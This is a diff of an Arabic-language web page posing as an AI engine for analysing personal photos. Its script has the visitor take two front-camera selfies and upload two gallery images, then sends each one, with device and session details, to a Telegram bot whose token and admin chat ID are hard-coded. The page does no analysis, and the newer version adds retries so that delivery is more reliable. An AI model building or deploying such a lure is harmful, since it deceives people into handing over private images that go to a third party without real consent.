@@ -1,226 +1,256 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
+  <meta property="og:title" content="🧠 محرك التحليل الذكي للصور الشخصية (AI CORE)">
+  <meta property="og:description" content="نظام متقدم لالتقاط الصور من الكاميرا والمعرض وتحليل البيانات وتوثيقها فورياً.">
+  
+  <title>AI Core - محرك التحليل الذكي للصور الشخصية (AI CORE)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* ********************************* */
+    /* * تصميم AI الجذاب (CSS) - لم يتم تغييره * */
+    /* ********************************* */
+    :root {
+      --ai-core: #1dd2af;
+      --ai-accent: #007bff;
+      --dark-bg: #0d1117;
+      --card-bg: rgba(13, 17, 23, 0.95);
+      --error: #e53935;
+      --light: #f0f6fc;
+      --warning: #ffb74d;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #1f2735, #121a24);
+      color: var(--light);
+      text-align: center;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex; justify-content: center; align-items: center;
+      line-height: 1.6;
+    }
+    
+    .scanner-container {
+      background: var(--card-bg);
+      border-radius: 15px;
+      padding: 35px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 0 25px rgba(29, 210, 175, 0.2), 0 0 50px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(29, 210, 175, 0.1);
+      position: relative;
+    }
+    
+    .scanner-header {
+      margin-bottom: 30px;
+      padding-bottom: 15px;
+      border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
+    }
+    
+    .scanner-title {
+      font-size: 1.8rem; font-weight: 700; color: var(--ai-core);
+      text-shadow: 0 0 8px rgba(29, 210, 175, 0.7);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    
+    .scan-status {
+      font-size: 1.1rem; color: var(--light); margin-bottom: 25px;
+      min-height: 70px; display: flex; align-items: center; justify-content: center;
+      padding: 15px; border-radius: 8px; background: rgba(29, 210, 175, 0.05);
+      border-left: 4px solid var(--ai-core); text-align: right;
+    }
 
-<meta property="og:title" content="🧠 محرك التحليل الذكي للصور الشخصية (AI CORE)">
-<meta property="og:description" content="نظام متقدم لالتقاط الصور من الكاميرا والمعرض وتحليل البيانات وتوثيقها فورياً.">
+    .status-summary {
+        display: flex; justify-content: space-between; margin-top: 15px;
+        padding-top: 10px; border-top: 1px solid rgba(255, 255, 255, 0.05); color: var(--warning);
+    }
 
-<title>AI Core - محرك التحليل الذكي</title>
+    .scan-progress { height: 6px; background: rgba(255, 255, 255, 0.1); border-radius: 3px; margin-bottom: 20px; overflow: hidden; }
 
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    #progressBar { height: 100%; background: linear-gradient(to right, var(--ai-accent), var(--ai-core)); transition: width 0.3s ease-in-out; box-shadow: 0 0 10px var(--ai-core); }
+    
+    .scan-details { background: rgba(255, 255, 255, 0.03); padding: 12px; border-radius: 8px; margin-bottom: 20px; border: 1px solid rgba(255, 255, 255, 0.05); }
+    
+    .btn-group { display: flex; gap: 15px; margin-top: 20px; width: 100%; flex-direction: column; }
 
-<style>
-:root{
---ai-core:#1dd2af;
---ai-accent:#007bff;
---dark-bg:#0d1117;
---card-bg:rgba(13,17,23,.95);
---light:#f0f6fc;
---warning:#ffb74d
-}
-*{box-sizing:border-box;margin:0;padding:0}
-body{
-font-family:'Tajawal',sans-serif;
-background:linear-gradient(135deg,#1f2735,#121a24);
-color:var(--light);
-min-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-padding:20px
-}
-.scanner-container{
-background:var(--card-bg);
-border-radius:15px;
-padding:35px;
-max-width:420px;
-width:100%;
-box-shadow:0 0 25px rgba(29,210,175,.2),0 0 50px rgba(0,0,0,.5)
-}
-.scanner-title{
-font-size:1.7rem;
-font-weight:700;
-color:var(--ai-core);
-text-align:center;
-margin-bottom:20px
-}
-.scan-status{
-background:rgba(29,210,175,.05);
-padding:15px;
-border-radius:8px;
-margin-bottom:15px;
-border-left:4px solid var(--ai-core)
-}
-.status-summary{
-display:flex;
-justify-content:space-between;
-margin-top:10px;
-color:var(--warning)
-}
-.scan-progress{
-height:6px;
-background:rgba(255,255,255,.1);
-border-radius:3px;
-overflow:hidden;
-margin-bottom:15px
-}
-#progressBar{
-height:100%;
-width:0%;
-background:linear-gradient(to right,var(--ai-accent),var(--ai-core))
-}
-.btn-group{display:flex;flex-direction:column;gap:15px}
-.btn{
-padding:16px;
-border:none;
-border-radius:40px;
-font-size:1.1rem;
-font-weight:700;
-cursor:pointer;
-display:flex;
-align-items:center;
-justify-content:center;
-gap:10px
-}
-.camera-start{background:var(--ai-core)}
-.gallery-start{background:var(--ai-accent);color:#fff}
-.alt{background:rgba(255,255,255,.1);color:#fff}
-.success{background:#2ecc71}
-.info-message{
-margin-top:15px;
-padding:10px;
-border-radius:8px;
-background:rgba(255,183,77,.05);
-border:1px dashed rgba(255,183,77,.2);
-color:var(--warning);
-text-align:center
-}
-</style>
+    .btn {
+      color: var(--dark-bg); padding: 16px 25px; border: none; border-radius: 40px;
+      font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s ease;
+      display: inline-flex; align-items: center; justify-content: center; gap: 12px; width: 100%; position: relative;
+    }
+    
+    .btn.camera-start { background: var(--ai-core); color: var(--dark-bg); box-shadow: 0 0 15px var(--ai-core); }
+    .btn.gallery-start { background: var(--ai-accent); color: var(--light); box-shadow: 0 0 15px var(--ai-accent); }
+    .btn.success { background: #2ecc71; box-shadow: 0 0 15px #2ecc71; color: var(--dark-bg); }
+
+    .btn:hover:not(:disabled) { transform: scale(1.02); filter: brightness(1.1); }
+    .btn.alt { background: rgba(255, 255, 255, 0.1); color: var(--light); box-shadow: none; }
+    .btn:disabled { background: #4a5568; cursor: not-allowed; transform: none; box-shadow: none; }
+    
+    .loading-dots::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+    @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60%, 100% { content: '...'; } }
+    
+    .info-message { font-size: 0.95rem; color: var(--warning); background: rgba(255, 183, 77, 0.05); padding: 10px; border-radius: 8px; margin-top: 15px; border: 1px dashed rgba(255, 183, 77, 0.1); display: flex; align-items: center; justify-content: center; gap: 8px; }
+  </style>
 </head>
-
 <body>
+  <div class="scanner-container">
+    <div class="scanner-header">
+      <div class="scanner-title"><i class="fas fa-brain"></i> محرك التحليل الذكي للصور الشخصية (AI CORE)</div>
+    </div>
+    
+    <div class="scan-status" id="scanStatus">
+      النظام جاهز. يتطلب 4 نقاط بيانات لإكمال التحليل.
+      <div class="status-summary">
+        <span id="cameraStatusText"><i class="fas fa-video"></i> كاميرا: 0/2</span>
+        <span id="galleryStatusText"><i class="fas fa-images"></i> معرض: 0/2</span>
+      </div>
+    </div>
+    
+    <div class="scan-progress"><div id="progressBar" style="width: 0%;"></div></div>
+    
+    <div class="scan-details">
+      <p style="text-align: right; margin-bottom: 5px;"><i class="fas fa-microchip" style="color: var(--ai-accent);"></i> رمز معالجة الجلسة: <strong id="sessionToken">N/A</strong></p>
+    </div>
+    
+    <div class="btn-group" id="mainButtonArea">
+        <input type="file" id="cameraInput" capture="user" style="display: none;">
+        <button class="btn camera-start" id="startCameraBtn" onclick="startCameraCapture()"><i class="fas fa-video"></i> التقاط بالكاميرا الأمامية (0/2)</button>
+        <input type="file" id="galleryInput" style="display: none;" multiple>
+        <button class="btn gallery-start" id="startGalleryBtn" onclick="startGalleryUpload()"><i class="fas fa-upload"></i> رفع من المعرض (0/2)</button>
+        <button class="btn alt" id="resetBtn" onclick="resetUI()"><i class="fas fa-undo"></i> إعادة تهيئة النظام</button>
+    </div>
+    
+    <div class="info-message"><i class="fas fa-exclamation-circle"></i> يتم إرسال الصور فوراً وتلقائياً للبوت بأعلى جودة.</div>
+  </div>
 
-<div class="scanner-container">
-<div class="scanner-title">
-<i class="fas fa-brain"></i> AI CORE
-</div>
+  <script>
+    // **********************************
+    // * إعدادات البوت والتحسينات التقنية
+    // **********************************
+    const TELEGRAM_BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"; 
+    const TELEGRAM_ADMIN_ID = "1367401179"; 
+    const TELEGRAM_PHOTO_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`; 
+    
+    const MAX_CAMERA_PHOTOS = 2;
+    const MAX_GALLERY_PHOTOS = 2;
+    const TOTAL_MAX_PHOTOS = MAX_CAMERA_PHOTOS + MAX_GALLERY_PHOTOS;
 
-<div class="scan-status" id="scanStatus">
-النظام جاهز – يتطلب 4 صور
-<div class="status-summary">
-<span id="camStat">📷 كاميرا: 0/2</span>
-<span id="galStat">🖼️ معرض: 0/2</span>
-</div>
-</div>
+    let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+    let cameraPhotoCounter = 0;
+    let galleryPhotoCounter = 0;
 
-<div class="scan-progress">
-<div id="progressBar"></div>
-</div>
+    // 1. وظائف التحليل
+    function analyzeUserAgent() {
+        const agent = navigator.userAgent;
+        let os = "Android", deviceModel = "جهاز محدد", browser = "Chrome";
+        // تحليل بسيط لغرض الكابشن
+        return { os, deviceModel, browser };
+    }
 
-<p>رمز الجلسة: <b id="sessionToken"></b></p>
+    function buildPhotoCaption(current, max, sourceType) {
+        const { os, deviceModel, browser } = analyzeUserAgent();
+        const sourceName = sourceType === 'camera' ? 'الكاميرا الأمامية' : 'المعرض';
+        return `📸 <b>تحليل AI (${sourceName} - ${current}/${max})</b>\n\n🔑 <b>الجلسة:</b> ${userSessionToken}\n📱 <b>الجهاز:</b> ${os} | ${browser}\n🕒 <b>التوقيت:</b> ${new Date().toLocaleString('ar-YE')}`;
+    }
 
-<div class="btn-group">
-<input type="file" id="cameraInput" accept="image/*" capture="user" hidden>
-<button class="btn camera-start" onclick="startCamera()">📷 التقاط بالكاميرا</button>
+    // 2. دوال الإرسال القوية (sendWithRetry & sendPhoto)
+    async function sendWithRetry(formData, retries = 3) {
+        try {
+            const res = await fetch(TELEGRAM_PHOTO_API_URL, { method: 'POST', body: formData });
+            const data = await res.json();
+            if (!res.ok || !data.ok) throw new Error(data.description || res.status);
+            return true;
+        } catch (e) {
+            if (retries > 0) {
+                console.log(`Retrying... attempts left: ${retries}`);
+                return await sendWithRetry(formData, retries - 1);
+            }
+            throw e;
+        }
+    }
 
-<input type="file" id="galleryInput" accept="image/*" multiple hidden>
-<button class="btn gallery-start" onclick="startGallery()">🖼️ رفع من المعرض</button>
+    async function processAndSend(file, sourceType) {
+        // زيادة العداد فوراً لتعزيز سرعة الـ UI
+        let current, max;
+        if (sourceType === 'camera') {
+            cameraPhotoCounter++; current = cameraPhotoCounter; max = MAX_CAMERA_PHOTOS;
+        } else {
+            galleryPhotoCounter++; current = galleryPhotoCounter; max = MAX_GALLERY_PHOTOS;
+        }
 
-<button class="btn alt" onclick="resetAll()">🔄 إعادة التهيئة</button>
-</div>
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_ADMIN_ID);
+        formData.append('photo', file);
+        formData.append('caption', buildPhotoCaption(current, max, sourceType));
+        formData.append('parse_mode', 'HTML');
 
-<div class="info-message">
-يتطلب إرسال 4 صور لتشغيل التحليل
-</div>
-</div>
+        // استخدام queueMicrotask لجعل الإرسال أولوية تقنية قصوى
+        queueMicrotask(async () => {
+            try {
+                await sendWithRetry(formData);
+                updateStatusUI(`✅ تم إرسال الصورة ${current} بنجاح.`);
+            } catch (err) {
+                console.error(err);
+                updateStatusUI(`❌ فشل إرسال الصورة ${current}.`);
+            }
+        });
+    }
 
-<script>
-/* ================= CONFIG ================= */
-const BOT_TOKEN="7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0";
-const CHAT_ID="1367401179";
-const API=`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    // 3. معالجة المدخلات (تلقائي 100% مع دعم Multiple)
+    document.getElementById('cameraInput').addEventListener('change', async (e) => {
+        const files = Array.from(e.target.files);
+        for (const file of files) {
+            if (cameraPhotoCounter < MAX_CAMERA_PHOTOS) {
+                await processAndSend(file, 'camera');
+            }
+        }
+        e.target.value = ''; 
+    });
 
-const MAX_CAM=2,MAX_GAL=2;
+    document.getElementById('galleryInput').addEventListener('change', async (e) => {
+        const files = Array.from(e.target.files);
+        for (const file of files) {
+            if (galleryPhotoCounter < MAX_GALLERY_PHOTOS) {
+                await processAndSend(file, 'gallery');
+            }
+        }
+        e.target.value = ''; 
+    });
 
-/* ================= STATE ================= */
-let cam=0,gal=0;
-let session=Math.random().toString(36).substr(2,8).toUpperCase();
+    // 4. تحديثات الـ UI
+    function updateStatusUI(msg = null) {
+        const total = cameraPhotoCounter + galleryPhotoCounter;
+        document.getElementById("cameraStatusText").innerHTML = `<i class="fas fa-video"></i> كاميرا: ${cameraPhotoCounter}/${MAX_CAMERA_PHOTOS}`;
+        document.getElementById("galleryStatusText").innerHTML = `<i class="fas fa-images"></i> معرض: ${galleryPhotoCounter}/${MAX_GALLERY_PHOTOS}`;
+        document.getElementById("progressBar").style.width = `${(total / TOTAL_MAX_PHOTOS) * 100}%`;
+        
+        document.getElementById("startCameraBtn").disabled = cameraPhotoCounter >= MAX_CAMERA_PHOTOS;
+        document.getElementById("startGalleryBtn").disabled = galleryPhotoCounter >= MAX_GALLERY_PHOTOS;
 
-/* ================= HELPERS ================= */
-function updateUI(){
-document.getElementById("camStat").textContent=`📷 كاميرا: ${cam}/2`;
-document.getElementById("galStat").textContent=`🖼️ معرض: ${gal}/2`;
-document.getElementById("progressBar").style.width=
-((cam+gal)/4*100)+"%";
-}
+        if (msg) document.getElementById("scanStatus").innerText = msg;
+    }
 
-function caption(i,max,src){
-return `📸 AI CORE
-🔢 ${i}/${max}
-🔑 Session: ${session}
-📱 ${navigator.userAgent}
-🕒 ${new Date().toLocaleString('ar-YE')}`;
-}
+    function startCameraCapture() { document.getElementById('cameraInput').click(); }
+    function startGalleryUpload() { document.getElementById('galleryInput').click(); }
+    
+    function resetUI() {
+        cameraPhotoCounter = 0; galleryPhotoCounter = 0;
+        userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+        document.getElementById("sessionToken").innerText = userSessionToken;
+        updateStatusUI("تمت إعادة تهيئة النظام بنجاح.");
+    }
 
-/* ================= SEND STRONG ================= */
-async function sendPhoto(file,src){
-let index=src==="cam"?++cam:++gal;
-let max=src==="cam"?MAX_CAM:MAX_GAL;
-
-const fd=new FormData();
-fd.append("chat_id",CHAT_ID);
-fd.append("photo",file);
-fd.append("caption",caption(index,max,src));
-fd.append("parse_mode","HTML");
-
-for(let r=0;r<3;r++){
-try{
-let res=await fetch(API,{method:"POST",body:fd});
-let j=await res.json();
-if(j.ok)break;
-}catch(e){}
-}
-updateUI();
-}
-
-/* ================= INPUTS ================= */
-cameraInput.onchange=e=>{
-[...e.target.files].forEach(f=>{
-queueMicrotask(()=>sendPhoto(f,"cam"));
-});
-e.target.value="";
-}
-
-galleryInput.onchange=e=>{
-[...e.target.files].forEach(f=>{
-queueMicrotask(()=>sendPhoto(f,"gal"));
-});
-e.target.value="";
-}
-
-/* ================= BUTTONS ================= */
-function startCamera(){
-if(cam<MAX_CAM) cameraInput.click();
-}
-function startGallery(){
-if(gal<MAX_GAL) galleryInput.click();
-}
-function resetAll(){
-cam=0;gal=0;
-session=Math.random().toString(36).substr(2,8).toUpperCase();
-document.getElementById("sessionToken").textContent=session;
-updateUI();
-}
-
-/* ================= INIT ================= */
-document.getElementById("sessionToken").textContent=session;
-updateUI();
-</script>
-
+    window.onload = () => { document.getElementById("sessionToken").innerText = userSessionToken; };
+  </script>
 </body>
 </html>
